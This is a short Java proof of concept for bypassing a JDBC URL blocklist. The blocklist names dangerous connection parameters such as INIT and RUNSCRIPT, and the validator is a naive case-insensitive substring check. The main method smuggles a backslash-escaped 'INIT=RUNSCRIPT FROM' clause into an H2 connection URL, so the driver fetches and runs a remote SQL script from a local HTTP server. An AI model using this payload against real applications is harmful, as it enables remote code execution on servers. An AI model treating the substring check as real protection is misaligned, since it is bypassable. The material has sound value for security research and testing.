package com.jdbc.tricks;

import java.sql.Connection;
import java.sql.DriverManager;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.Stream;

/**
 * Hello world!
 */
public class App {

    private static final List<String> DEFAULT_JDBC_DISALLOWED_PARAMETERS = (List<String>) Stream.<String>of(
            new String[]{"allowLoadLocalInfileInPath", "allowUrlInLocalInfile",
                    "allowPublicKeyRetrieval", "autoDeserialize", "queryInterceptors",
                    "allowLoadLocalInfile", "allowMultiQueries", "init", "script", "shutdown"}
    ).map(String::toUpperCase).collect(Collectors.toList());


    public static void main(String[] args) throws Exception {

        String url = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;I\\NIT=R\\UNSCR\\IPT FROM 'http://127.0.0.1:8000/poc.sql'--\\;FORBID_CREATION=TRUE";
        validateJdbcUrl(url);
        Class.forName("org.h2.Driver");
        Connection connection = DriverManager.getConnection(url);
    }

    public static void validateJdbcUrl(String jdbcUrl) throws IllegalArgumentException {
        for (String disallowed : DEFAULT_JDBC_DISALLOWED_PARAMETERS) {
            if (jdbcUrl.toUpperCase().contains(disallowed))
                throw new IllegalArgumentException("JDBC URL " + jdbcUrl + " is invalid");
        }
    }

}
